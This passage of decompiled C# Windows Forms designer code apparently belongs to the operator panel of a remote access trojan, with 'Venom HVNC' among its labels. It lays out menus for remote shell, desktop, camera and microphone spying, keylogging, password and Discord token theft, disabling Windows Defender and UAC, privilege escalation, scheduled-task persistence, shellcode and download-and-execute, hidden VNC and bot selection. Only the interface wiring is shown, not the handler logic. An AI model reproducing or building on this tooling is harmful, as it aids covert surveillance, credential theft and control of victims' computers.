			this.UpdateToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem";
			this.UpdateToolStripMenuItem.Size = new global::System.Drawing.Size(169, 24);
			this.UpdateToolStripMenuItem.Text = "Client Update";
			this.UpdateToolStripMenuItem.Click += new global::System.EventHandler(this.UpdateToolStripMenuItem_Click);
			this.controlManagementToolStripMenuItem20.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.controlManagementToolStripMenuItem20.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.LogoutToolStripMenuItem,
				this.RebootToolStripMenuItem,
				this.ShutDownToolStripMenuItem
			});
			this.controlManagementToolStripMenuItem20.ForeColor = global::System.Drawing.Color.DarkGray;
			this.controlManagementToolStripMenuItem20.Name = "controlManagementToolStripMenuItem20";
			this.controlManagementToolStripMenuItem20.Size = new global::System.Drawing.Size(206, 24);
			this.controlManagementToolStripMenuItem20.Text = "Client Restart";
			this.LogoutToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.LogoutToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.LogoutToolStripMenuItem.Name = "LogoutToolStripMenuItem";
			this.LogoutToolStripMenuItem.Size = new global::System.Drawing.Size(150, 24);
			this.LogoutToolStripMenuItem.Text = "Logout";
			this.LogoutToolStripMenuItem.Click += new global::System.EventHandler(this.LogoutToolStripMenuItem_Click);
			this.RebootToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.RebootToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.RebootToolStripMenuItem.Name = "RebootToolStripMenuItem";
			this.RebootToolStripMenuItem.Size = new global::System.Drawing.Size(150, 24);
			this.RebootToolStripMenuItem.Text = "Reboot";
			this.RebootToolStripMenuItem.Click += new global::System.EventHandler(this.RebootToolStripMenuItem_Click);
			this.ShutDownToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.ShutDownToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.ShutDownToolStripMenuItem.Name = "ShutDownToolStripMenuItem";
			this.ShutDownToolStripMenuItem.Size = new global::System.Drawing.Size(150, 24);
			this.ShutDownToolStripMenuItem.Text = "Shut Down";
			this.ShutDownToolStripMenuItem.Click += new global::System.EventHandler(this.ShutDownToolStripMenuItem_Click);
			this.controlManagementToolStripMenuItem2.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.RemoteShellToolStripMenuItem,
				this.RemoteScreenToolStripMenuItem,
				this.RemoteCameraToolStripMenuItem,
				this.FileManagerToolStripMenuItem1,
				this.remoteRegeditToolStripMenuItem,
				this.ProcessManagerToolStripMenuItem,
				this.netstatToolStripMenuItem,
				this.RecordToolStripMenuItem
			});
			this.controlManagementToolStripMenuItem2.ForeColor = global::System.Drawing.Color.DarkGray;
			this.controlManagementToolStripMenuItem2.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("controlManagementToolStripMenuItem2.Image");
			this.controlManagementToolStripMenuItem2.Name = "controlManagementToolStripMenuItem2";
			this.controlManagementToolStripMenuItem2.Size = new global::System.Drawing.Size(246, 34);
			this.controlManagementToolStripMenuItem2.Text = "    Control Management";
			this.RemoteShellToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.RemoteShellToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.RemoteShellToolStripMenuItem.Name = "RemoteShellToolStripMenuItem";
			this.RemoteShellToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.RemoteShellToolStripMenuItem.Text = "Open CMD";
			this.RemoteShellToolStripMenuItem.Click += new global::System.EventHandler(this.RemoteShellToolStripMenuItem_Click);
			this.RemoteScreenToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.RemoteScreenToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.RemoteScreenToolStripMenuItem.Name = "RemoteScreenToolStripMenuItem";
			this.RemoteScreenToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.RemoteScreenToolStripMenuItem.Text = "Remote Desktop";
			this.RemoteScreenToolStripMenuItem.Click += new global::System.EventHandler(this.RemoteScreenToolStripMenuItem_Click);
			this.RemoteCameraToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.RemoteCameraToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.RemoteCameraToolStripMenuItem.Name = "RemoteCameraToolStripMenuItem";
			this.RemoteCameraToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.RemoteCameraToolStripMenuItem.Text = "Open Camera";
			this.RemoteCameraToolStripMenuItem.Click += new global::System.EventHandler(this.RemoteCameraToolStripMenuItem_Click);
			this.FileManagerToolStripMenuItem1.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.FileManagerToolStripMenuItem1.ForeColor = global::System.Drawing.Color.DarkGray;
			this.FileManagerToolStripMenuItem1.Name = "FileManagerToolStripMenuItem1";
			this.FileManagerToolStripMenuItem1.Size = new global::System.Drawing.Size(202, 24);
			this.FileManagerToolStripMenuItem1.Text = "File Manager";
			this.FileManagerToolStripMenuItem1.Click += new global::System.EventHandler(this.FileManagerToolStripMenuItem1_Click);
			this.remoteRegeditToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.remoteRegeditToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.remoteRegeditToolStripMenuItem.Name = "remoteRegeditToolStripMenuItem";
			this.remoteRegeditToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.remoteRegeditToolStripMenuItem.Text = "Regedit";
			this.remoteRegeditToolStripMenuItem.Click += new global::System.EventHandler(this.remoteRegeditToolStripMenuItem_Click);
			this.ProcessManagerToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.ProcessManagerToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.ProcessManagerToolStripMenuItem.Name = "ProcessManagerToolStripMenuItem";
			this.ProcessManagerToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.ProcessManagerToolStripMenuItem.Text = "Process Manager";
			this.ProcessManagerToolStripMenuItem.Click += new global::System.EventHandler(this.ProcessManagerToolStripMenuItem_Click);
			this.netstatToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.netstatToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.netstatToolStripMenuItem.Name = "netstatToolStripMenuItem";
			this.netstatToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.netstatToolStripMenuItem.Text = "Networks Statistics";
			this.netstatToolStripMenuItem.Click += new global::System.EventHandler(this.netstatToolStripMenuItem_Click);
			this.RecordToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.RecordToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.RecordToolStripMenuItem.Name = "RecordToolStripMenuItem";
			this.RecordToolStripMenuItem.Size = new global::System.Drawing.Size(202, 24);
			this.RecordToolStripMenuItem.Text = "Mic Record";
			this.RecordToolStripMenuItem.Click += new global::System.EventHandler(this.RecordToolStripMenuItem_Click);
			this.controlManagementToolStripMenuItem3.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.VisteWebsiteToolStripMenuItem1,
				this.runShellcodeToolStripMenuItem,
				this.ChangeWallpaperToolStripMenuItem1,
				this.FileSearchToolStripMenuItem
			});
			this.controlManagementToolStripMenuItem3.ForeColor = global::System.Drawing.Color.DarkGray;
			this.controlManagementToolStripMenuItem3.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("controlManagementToolStripMenuItem3.Image");
			this.controlManagementToolStripMenuItem3.Name = "controlManagementToolStripMenuItem3";
			this.controlManagementToolStripMenuItem3.Size = new global::System.Drawing.Size(246, 34);
			this.controlManagementToolStripMenuItem3.Text = "    Control";
			this.VisteWebsiteToolStripMenuItem1.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.VisteWebsiteToolStripMenuItem1.ForeColor = global::System.Drawing.Color.DarkGray;
			this.VisteWebsiteToolStripMenuItem1.Name = "VisteWebsiteToolStripMenuItem1";
			this.VisteWebsiteToolStripMenuItem1.Size = new global::System.Drawing.Size(200, 24);
			this.VisteWebsiteToolStripMenuItem1.Text = "Visit Website";
			this.VisteWebsiteToolStripMenuItem1.Click += new global::System.EventHandler(this.VisteWebsiteToolStripMenuItem1_Click);
			this.runShellcodeToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.runShellcodeToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.runShellcodeToolStripMenuItem.Name = "runShellcodeToolStripMenuItem";
			this.runShellcodeToolStripMenuItem.Size = new global::System.Drawing.Size(200, 24);
			this.runShellcodeToolStripMenuItem.Text = "Execute Shellcode";
			this.runShellcodeToolStripMenuItem.Click += new global::System.EventHandler(this.runShellcodeToolStripMenuItem_Click);
			this.ChangeWallpaperToolStripMenuItem1.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.ChangeWallpaperToolStripMenuItem1.ForeColor = global::System.Drawing.Color.DarkGray;
			this.ChangeWallpaperToolStripMenuItem1.Name = "ChangeWallpaperToolStripMenuItem1";
			this.ChangeWallpaperToolStripMenuItem1.Size = new global::System.Drawing.Size(200, 24);
			this.ChangeWallpaperToolStripMenuItem1.Text = "Change Wallpaper";
			this.ChangeWallpaperToolStripMenuItem1.Click += new global::System.EventHandler(this.ChangeWallpaperToolStripMenuItem1_Click);
			this.FileSearchToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.FileSearchToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.FileSearchToolStripMenuItem.Name = "FileSearchToolStripMenuItem";
			this.FileSearchToolStripMenuItem.Size = new global::System.Drawing.Size(200, 24);
			this.FileSearchToolStripMenuItem.Text = "File Search";
			this.FileSearchToolStripMenuItem.Click += new global::System.EventHandler(this.FileSearchToolStripMenuItem_Click);
			this.controlManagementToolStripMenuItem4.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.DisableWDToolStripMenuItem,
				this.DisableUACToolStripMenuItem
			});
			this.controlManagementToolStripMenuItem4.ForeColor = global::System.Drawing.Color.DarkGray;
			this.controlManagementToolStripMenuItem4.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("controlManagementToolStripMenuItem4.Image");
			this.controlManagementToolStripMenuItem4.Name = "controlManagementToolStripMenuItem4";
			this.controlManagementToolStripMenuItem4.Size = new global::System.Drawing.Size(246, 34);
			this.controlManagementToolStripMenuItem4.Text = "    WD Bypassing";
			this.DisableWDToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.DisableWDToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.DisableWDToolStripMenuItem.Name = "DisableWDToolStripMenuItem";
			this.DisableWDToolStripMenuItem.Size = new global::System.Drawing.Size(161, 24);
			this.DisableWDToolStripMenuItem.Text = "Disable WD";
			this.DisableWDToolStripMenuItem.Click += new global::System.EventHandler(this.DisableWDToolStripMenuItem_Click);
			this.DisableUACToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.DisableUACToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.DisableUACToolStripMenuItem.Name = "DisableUACToolStripMenuItem";
			this.DisableUACToolStripMenuItem.Size = new global::System.Drawing.Size(161, 24);
			this.DisableUACToolStripMenuItem.Text = "Disable UAC";
			this.DisableUACToolStripMenuItem.Click += new global::System.EventHandler(this.DisableUACToolStripMenuItem_Click);
			this.controlManagementToolStripMenuItem5.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.SilentCleanupToolStripMenuItem,
				this.RunasToolStripMenuItem
			});
			this.controlManagementToolStripMenuItem5.ForeColor = global::System.Drawing.Color.DarkGray;
			this.controlManagementToolStripMenuItem5.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("controlManagementToolStripMenuItem5.Image");
			this.controlManagementToolStripMenuItem5.Name = "controlManagementToolStripMenuItem5";
			this.controlManagementToolStripMenuItem5.Size = new global::System.Drawing.Size(246, 34);
			this.controlManagementToolStripMenuItem5.Text = "    UAC Privileges";
			this.SilentCleanupToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.SilentCleanupToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.SilentCleanupToolStripMenuItem.Name = "SilentCleanupToolStripMenuItem";
			this.SilentCleanupToolStripMenuItem.Size = new global::System.Drawing.Size(304, 24);
			this.SilentCleanupToolStripMenuItem.Text = "Privileges Windows 8.1/10/Servers";
			this.SilentCleanupToolStripMenuItem.Click += new global::System.EventHandler(this.SilentCleanupToolStripMenuItem_Click);
			this.RunasToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.RunasToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.RunasToolStripMenuItem.Name = "RunasToolStripMenuItem";
			this.RunasToolStripMenuItem.Size = new global::System.Drawing.Size(304, 24);
			this.RunasToolStripMenuItem.Text = "Privileges Windows 7";
			this.RunasToolStripMenuItem.Click += new global::System.EventHandler(this.RunasToolStripMenuItem_Click);
			this.controlManagementToolStripMenuItem6.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.SchtaskInstallToolStripMenuItem,
				this.SchtaskUninstallToolStripMenuItem
			});
			this.controlManagementToolStripMenuItem6.ForeColor = global::System.Drawing.Color.DarkGray;
			this.controlManagementToolStripMenuItem6.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("controlManagementToolStripMenuItem6.Image");
			this.controlManagementToolStripMenuItem6.Name = "controlManagementToolStripMenuItem6";
			this.controlManagementToolStripMenuItem6.Size = new global::System.Drawing.Size(246, 34);
			this.controlManagementToolStripMenuItem6.Text = "    Active Task Scheduler";
			this.SchtaskInstallToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.SchtaskInstallToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.SchtaskInstallToolStripMenuItem.Name = "SchtaskInstallToolStripMenuItem";
			this.SchtaskInstallToolStripMenuItem.Size = new global::System.Drawing.Size(235, 24);
			this.SchtaskInstallToolStripMenuItem.Text = "Task Scheduler Install";
			this.SchtaskInstallToolStripMenuItem.Click += new global::System.EventHandler(this.SchtaskInstallToolStripMenuItem_Click);
			this.SchtaskUninstallToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.SchtaskUninstallToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.SchtaskUninstallToolStripMenuItem.Name = "SchtaskUninstallToolStripMenuItem";
			this.SchtaskUninstallToolStripMenuItem.Size = new global::System.Drawing.Size(235, 24);
			this.SchtaskUninstallToolStripMenuItem.Text = "Task Scheduler Uninstall";
			this.SchtaskUninstallToolStripMenuItem.Click += new global::System.EventHandler(this.SchtaskUninstallToolStripMenuItem_Click);
			this.controlManagementToolStripMenuItem7.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.passwordRecoveryToolStripMenuItem,
				this.toolStripMenuItem3,
				this.autoKeyloggerToolStripMenuItem
			});
			this.controlManagementToolStripMenuItem7.ForeColor = global::System.Drawing.Color.DarkGray;
			this.controlManagementToolStripMenuItem7.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("controlManagementToolStripMenuItem7.Image");
			this.controlManagementToolStripMenuItem7.Name = "controlManagementToolStripMenuItem7";
			this.controlManagementToolStripMenuItem7.Size = new global::System.Drawing.Size(246, 34);
			this.controlManagementToolStripMenuItem7.Text = "    KeyLogger";
			this.passwordRecoveryToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.passwordRecoveryToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
			this.passwordRecoveryToolStripMenuItem.Size = new global::System.Drawing.Size(203, 24);
			this.passwordRecoveryToolStripMenuItem.Text = "Password Recovery";
			this.passwordRecoveryToolStripMenuItem.Click += new global::System.EventHandler(this.PasswordRecoveryToolStripMenuItem_Click);
			this.toolStripMenuItem3.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.toolStripMenuItem3.ForeColor = global::System.Drawing.Color.DarkGray;
			this.toolStripMenuItem3.Name = "toolStripMenuItem3";
			this.toolStripMenuItem3.Size = new global::System.Drawing.Size(203, 24);
			this.toolStripMenuItem3.Text = "Online KeyLogger";
			this.toolStripMenuItem3.Click += new global::System.EventHandler(this.KeyloggerToolStripMenuItem1_Click);
			this.autoKeyloggerToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.autoKeyloggerToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.autoKeyloggerToolStripMenuItem.Name = "autoKeyloggerToolStripMenuItem";
			this.autoKeyloggerToolStripMenuItem.Size = new global::System.Drawing.Size(203, 24);
			this.autoKeyloggerToolStripMenuItem.Text = "Offline KeyLogger";
			this.autoKeyloggerToolStripMenuItem.Click += new global::System.EventHandler(this.autoKeyloggerToolStripMenuItem_Click);
			this.controlManagementToolStripMenuItem8.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.DiscordRecoveryToolStripMenuItem
			});
			this.controlManagementToolStripMenuItem8.ForeColor = global::System.Drawing.Color.DarkGray;
			this.controlManagementToolStripMenuItem8.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("controlManagementToolStripMenuItem8.Image");
			this.controlManagementToolStripMenuItem8.Name = "controlManagementToolStripMenuItem8";
			this.controlManagementToolStripMenuItem8.Size = new global::System.Drawing.Size(246, 34);
			this.controlManagementToolStripMenuItem8.Text = "    Discord";
			this.DiscordRecoveryToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.DiscordRecoveryToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.DiscordRecoveryToolStripMenuItem.Name = "DiscordRecoveryToolStripMenuItem";
			this.DiscordRecoveryToolStripMenuItem.Size = new global::System.Drawing.Size(236, 24);
			this.DiscordRecoveryToolStripMenuItem.Text = "Token Discord Recovery";
			this.DiscordRecoveryToolStripMenuItem.Click += new global::System.EventHandler(this.DiscordRecoveryToolStripMenuItem_Click);
			this.controlManagementToolStripMenuItem9.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.BtnHVNCPanel,
				this.moveToHVNCToolStripMenuItem
			});
			this.controlManagementToolStripMenuItem9.ForeColor = global::System.Drawing.Color.DarkGray;
			this.controlManagementToolStripMenuItem9.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("controlManagementToolStripMenuItem9.Image");
			this.controlManagementToolStripMenuItem9.Name = "controlManagementToolStripMenuItem9";
			this.controlManagementToolStripMenuItem9.Size = new global::System.Drawing.Size(246, 34);
			this.controlManagementToolStripMenuItem9.Text = "    hVNC";
			this.BtnHVNCPanel.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.BtnHVNCPanel.ForeColor = global::System.Drawing.Color.DarkGray;
			this.BtnHVNCPanel.Name = "BtnHVNCPanel";
			this.BtnHVNCPanel.Size = new global::System.Drawing.Size(221, 24);
			this.BtnHVNCPanel.Text = "Venom HVNC";
			this.BtnHVNCPanel.Click += new global::System.EventHandler(this.siticoneGradientButton3_Click);
			this.moveToHVNCToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.moveToHVNCToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.moveToHVNCToolStripMenuItem.Name = "moveToHVNCToolStripMenuItem";
			this.moveToHVNCToolStripMenuItem.Size = new global::System.Drawing.Size(221, 24);
			this.moveToHVNCToolStripMenuItem.Text = "Move Client To HVNC";
			this.moveToHVNCToolStripMenuItem.Click += new global::System.EventHandler(this.SendFileToDiskToolStripMenuItem_Click);
			this.executeToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.executeToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.SendFileToMemoryToolStripMenuItem,
				this.SendFileToDiskToolStripMenuItem,
				this.fromUrlToolStripMenuItem
			});
			this.executeToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.executeToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("executeToolStripMenuItem.Image");
			this.executeToolStripMenuItem.Name = "executeToolStripMenuItem";
			this.executeToolStripMenuItem.Size = new global::System.Drawing.Size(246, 34);
			this.executeToolStripMenuItem.Text = "    Download Execute";
			this.SendFileToMemoryToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.SendFileToMemoryToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.SendFileToMemoryToolStripMenuItem.Name = "SendFileToMemoryToolStripMenuItem";
			this.SendFileToMemoryToolStripMenuItem.Size = new global::System.Drawing.Size(226, 24);
			this.SendFileToMemoryToolStripMenuItem.Text = "Execute From Memory";
			this.SendFileToMemoryToolStripMenuItem.Click += new global::System.EventHandler(this.SendFileToMemoryToolStripMenuItem_Click);
			this.SendFileToDiskToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.SendFileToDiskToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.SendFileToDiskToolStripMenuItem.Name = "SendFileToDiskToolStripMenuItem";
			this.SendFileToDiskToolStripMenuItem.Size = new global::System.Drawing.Size(226, 24);
			this.SendFileToDiskToolStripMenuItem.Text = "Execute From Disk";
			this.SendFileToDiskToolStripMenuItem.Click += new global::System.EventHandler(this.SendFileToDiskToolStripMenuItem_Click);
			this.fromUrlToolStripMenuItem.BackColor = global::System.Drawing.Color.FromArgb(27, 31, 28);
			this.fromUrlToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.fromUrlToolStripMenuItem.Name = "fromUrlToolStripMenuItem";
			this.fromUrlToolStripMenuItem.Size = new global::System.Drawing.Size(226, 24);
			this.fromUrlToolStripMenuItem.Text = "Upload File From URL";
			this.fromUrlToolStripMenuItem.Click += new global::System.EventHandler(this.fromUrlToolStripMenuItem_Click);
			this.justForFunToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.justForFunToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("justForFunToolStripMenuItem.Image");
			this.justForFunToolStripMenuItem.Name = "justForFunToolStripMenuItem";
			this.justForFunToolStripMenuItem.Size = new global::System.Drawing.Size(246, 34);
			this.justForFunToolStripMenuItem.Text = "    Fun System";
			this.justForFunToolStripMenuItem.Click += new global::System.EventHandler(this.justForFunToolStripMenuItem_Click);
			this.BtnClientFolders.ForeColor = global::System.Drawing.Color.DarkGray;
			this.BtnClientFolders.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("BtnClientFolders.Image");
			this.BtnClientFolders.Name = "BtnClientFolders";
			this.BtnClientFolders.Size = new global::System.Drawing.Size(246, 34);
			this.BtnClientFolders.Text = "    Client Folder";
			this.BtnClientFolders.Click += new global::System.EventHandler(this.BtnClientFolder_Click);
			this.InformationToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.InformationToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("InformationToolStripMenuItem.Image");
			this.InformationToolStripMenuItem.Name = "InformationToolStripMenuItem";
			this.InformationToolStripMenuItem.Size = new global::System.Drawing.Size(246, 34);
			this.InformationToolStripMenuItem.Text = "    Information";
			this.InformationToolStripMenuItem.Click += new global::System.EventHandler(this.InformationToolStripMenuItem_Click);
			this.selectToolStripMenuItem.ForeColor = global::System.Drawing.Color.DarkGray;
			this.selectToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("selectToolStripMenuItem.Image");
			this.selectToolStripMenuItem.Name = "selectToolStripMenuItem";
			this.selectToolStripMenuItem.Size = new global::System.Drawing.Size(246, 34);
			this.selectToolStripMenuItem.Text = "    Select Bots";
			this.selectToolStripMenuItem.Click += new global::System.EventHandler(this.selectToolStripMenuItem_Click);
			this.tabPage2.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.tabPage2.Controls.Add(this.listView2);
			this.tabPage2.Controls.Add(this.siticoneGradientPanel8);
			this.tabPage2.ImageIndex = 6;
			this.tabPage2.Location = new global::System.Drawing.Point(4, 44);
			this.tabPage2.Name = "tabPage2";
			this.tabPage2.Padding = new global::System.Windows.Forms.Padding(3);
			this.tabPage2.Size = new global::System.Drawing.Size(1552, 641);
			this.tabPage2.TabIndex = 1;
			this.tabPage2.Text = "Task Activity";
			this.siticoneGradientPanel8.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel8.Controls.Add(this.cLEARToolStripMenuItem);
			this.siticoneGradientPanel8.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.siticoneGradientPanel8.FillColor = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel8.FillColor2 = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel8.Location = new global::System.Drawing.Point(3, 614);
			this.siticoneGradientPanel8.Name = "siticoneGradientPanel8";
			this.siticoneGradientPanel8.ShadowDecoration.Parent = this.siticoneGradientPanel8;
			this.siticoneGradientPanel8.Size = new global::System.Drawing.Size(1546, 24);
			this.siticoneGradientPanel8.TabIndex = 127;
			this.cLEARToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.cLEARToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.cLEARToolStripMenuItem.BorderRadius = 1;
			this.cLEARToolStripMenuItem.BorderThickness = 1;
			this.cLEARToolStripMenuItem.CheckedState.Parent = this.cLEARToolStripMenuItem;
			this.cLEARToolStripMenuItem.CustomImages.Parent = this.cLEARToolStripMenuItem;
			this.cLEARToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.cLEARToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.cLEARToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.cLEARToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.cLEARToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.cLEARToolStripMenuItem.DisabledState.Parent = this.cLEARToolStripMenuItem;
			this.cLEARToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.cLEARToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.cLEARToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.cLEARToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.cLEARToolStripMenuItem.HoverState.Parent = this.cLEARToolStripMenuItem;
			this.cLEARToolStripMenuItem.Location = new global::System.Drawing.Point(5, 0);
			this.cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
			this.cLEARToolStripMenuItem.ShadowDecoration.Parent = this.cLEARToolStripMenuItem;
			this.cLEARToolStripMenuItem.Size = new global::System.Drawing.Size(121, 24);
			this.cLEARToolStripMenuItem.TabIndex = 11;
			this.cLEARToolStripMenuItem.Text = "Clean Logs";
			this.cLEARToolStripMenuItem.Click += new global::System.EventHandler(this.CLEARToolStripMenuItem_Click);
			this.tabPage3.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.tabPage3.Controls.Add(this.listView3);
			this.tabPage3.Controls.Add(this.siticoneGradientPanel4);
			this.tabPage3.Controls.Add(this.siticoneGradientPanel5);
			this.tabPage3.ImageIndex = 5;
			this.tabPage3.Location = new global::System.Drawing.Point(4, 44);
			this.tabPage3.Name = "tabPage3";
			this.tabPage3.Padding = new global::System.Windows.Forms.Padding(3);
			this.tabPage3.Size = new global::System.Drawing.Size(1552, 641);
			this.tabPage3.TabIndex = 2;
			this.tabPage3.Text = "ThumbnailI";
			this.siticoneGradientPanel4.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			this.siticoneGradientPanel4.Controls.Add(this.siticoneGradientButton2);
			this.siticoneGradientPanel4.Controls.Add(this.siticoneGradientButton9);
			this.siticoneGradientPanel4.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.siticoneGradientPanel4.FillColor = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel4.FillColor2 = global::System.Drawing.Color.FromArgb(36, 36, 36);
			this.siticoneGradientPanel4.Location = new global::System.Drawing.Point(3, 3);
			this.siticoneGradientPanel4.Name = "siticoneGradientPanel4";
			this.siticoneGradientPanel4.ShadowDecoration.Parent = this.siticoneGradientPanel4;
			this.siticoneGradientPanel4.Size = new global::System.Drawing.Size(1546, 24);
			this.siticoneGradientPanel4.TabIndex = 125;
			this.siticoneGradientButton2.BackColor = global::System.Drawing.Color.Transparent;
			this.siticoneGradientButton2.BorderColor = global::System.Drawing.Color.Transparent;
